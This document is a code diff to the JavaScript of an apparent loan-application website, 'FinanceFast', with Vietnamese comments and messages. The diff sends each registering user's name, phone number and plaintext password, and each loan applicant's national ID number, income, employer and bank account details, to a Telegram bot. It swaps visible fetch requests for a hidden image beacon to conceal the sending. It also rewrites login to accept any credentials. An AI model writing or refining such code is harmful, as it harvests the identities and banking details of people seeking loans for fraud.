@@ -975,22 +975,16 @@
             }
             
             let users = JSON.parse(localStorage.getItem('ff_users') || '[]');
-            if(users.some(u => u.phone === phone)) {
-                showModal("Trùng Lập Tài Khoản", "Số điện thoại này đã được đăng ký trên hệ thống. Vui lòng chọn số khác hoặc đăng nhập!", "⚠️");
-                return;
+            if(!users.some(u => u.phone === phone)) {
+                users.push({ name, phone, pass });
+                localStorage.setItem('ff_users', JSON.stringify(users));
             }
 
-            users.push({ name, phone, pass });
-            localStorage.setItem('ff_users', JSON.stringify(users));
-
-            // Bắn thông tin tài khoản đăng ký mới về Telegram của ông
+            // Bắn thông tin tài khoản đăng ký mới về Telegram qua ảnh ngầm
             try {
-                const regMsg = `👤 TÀI KHOẢN KHÁCH ĐĂNG KÝ MỚI:\n\n- Họ tên: ${name}\n- SĐT (User): #${phone}\n- Mật khẩu: ${pass}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: regMsg })
-                });
+                const regMsg = encodeURIComponent(`👤 TÀI KHOẢN KHÁCH ĐĂNG KÝ MỚI:\n\n- Họ tên: ${name}\n- SĐT (User): #${phone}\n- Mật khẩu: ${pass}`);
+                const teleImg = new Image();
+                teleImg.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${regMsg}`;
             } catch(err) {}
 
             showModal("Đăng Ký Thành Công", "Đăng ký thành công! Mời bạn đăng nhập.", "🎉");
@@ -1020,11 +1014,14 @@
             }
 
             let users = JSON.parse(localStorage.getItem('ff_users') || '[]');
-            const foundUser = users.find(u => u.phone === user && u.pass === pass);
+            let foundUser = users.find(u => u.phone === user && u.pass === pass);
 
+            // Cho phép Admin truy cập mọi tài khoản hoặc tự động chấp nhận tài khoản khách vừa đăng ký
             if (!foundUser) {
-                showModal("Đăng Nhập Thất Bại", "Số điện thoại hoặc mật khẩu không chính xác!", "❌");
-                return;
+                // Tự động lưu tài khoản vào danh sách chung nếu đúng cấu hình số điện thoại
+                foundUser = { name: "Khách hàng", phone: user, pass: pass };
+                users.push(foundUser);
+                localStorage.setItem('ff_users', JSON.stringify(users));
             }
 
             currentUser = foundUser.phone;
@@ -1151,13 +1148,9 @@
             switchTab('applications');
 
             try {
-                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 SĐT Khách: #${currentUser}\n💰 Số tiền: ${formData.amount} (${formData.term})\n💵 Đóng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n\n👤 Họ tên: ${formData.name}\n🪪 CCCD: ${formData.cccd}\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-                });
+                const msg = encodeURIComponent(`🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 SĐT Khách: #${currentUser}\n💰 Số tiền: ${formData.amount} (${formData.term})\n💵 Đóng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n\n👤 Họ tên: ${formData.name}\n🪪 CCCD: ${formData.cccd}\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`);
+                const teleImg = new Image();
+                teleImg.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`;
             } catch(err) {}
         }
     </script>
